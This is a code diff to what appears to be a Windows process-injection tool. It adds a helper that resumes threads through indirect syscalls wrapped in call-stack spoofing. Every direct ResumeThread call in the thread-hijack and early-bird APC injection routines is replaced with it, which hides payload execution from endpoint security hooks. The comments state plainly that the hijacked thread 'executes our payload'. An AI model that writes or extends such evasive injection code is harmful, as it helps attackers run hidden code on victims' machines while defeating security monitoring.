@@ -27,6 +27,18 @@
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
 
+/* ─── Resume helper: always use indirect syscall when available ─── */
+static inline void _resume_thread(HANDLE hThread) {
+#if CONFIG_INDIRECT_SYSCALLS
+    ULONG suspendCount = 0;
+    SPOOF_BEGIN();
+    Sw_NtResumeThread(hThread, &suspendCount);
+    SPOOF_END();
+#else
+    ResumeThread(hThread);
+#endif
+}
+
 /* ─── Helpers ─── */
 
 static void _set_error(INJECT_RESULT *r, const char *msg, DWORD code) {
@@ -279,14 +291,14 @@ static BOOL _inject_thread_hijack(HANDLE hProc, void *remoteBase,
     SPOOF_END();
     if (!NT_SUCCESS(status)) {
         _set_error(result, "NtGetContextThread failed", (DWORD)status);
-        ResumeThread(hThread);
+        _resume_thread(hThread);
         if (ownedThread) CloseHandle(hThread);
         return FALSE;
     }
 #else
     if (!GetThreadContext(hThread, &ctx)) {
         _set_error(result, "GetThreadContext failed", GetLastError());
-        ResumeThread(hThread);
+        _resume_thread(hThread);
         if (ownedThread) CloseHandle(hThread);
         return FALSE;
     }
@@ -315,21 +327,21 @@ static BOOL _inject_thread_hijack(HANDLE hProc, void *remoteBase,
     SPOOF_END();
     if (!NT_SUCCESS(status)) {
         _set_error(result, "NtSetContextThread failed", (DWORD)status);
-        ResumeThread(hThread);
+        _resume_thread(hThread);
         if (ownedThread) CloseHandle(hThread);
         return FALSE;
     }
 #else
     if (!SetThreadContext(hThread, &ctx)) {
         _set_error(result, "SetThreadContext failed", GetLastError());
-        ResumeThread(hThread);
+        _resume_thread(hThread);
         if (ownedThread) CloseHandle(hThread);
         return FALSE;
     }
 #endif
 
     /* Resume thread — it now executes our payload */
-    ResumeThread(hThread);
+    _resume_thread(hThread);
     result->hThread = hThread;
 
     if (opts->waitForCompletion) {
@@ -414,7 +426,7 @@ static BOOL _inject_early_bird(const unsigned char *payload, SIZE_T payloadLen,
 #endif
 
     /* Resume — APC fires before main thread entry point */
-    ResumeThread(pi.hThread);
+    _resume_thread(pi.hThread);
 
     if (opts->waitForCompletion) {
         WaitForSingleObject(pi.hProcess,
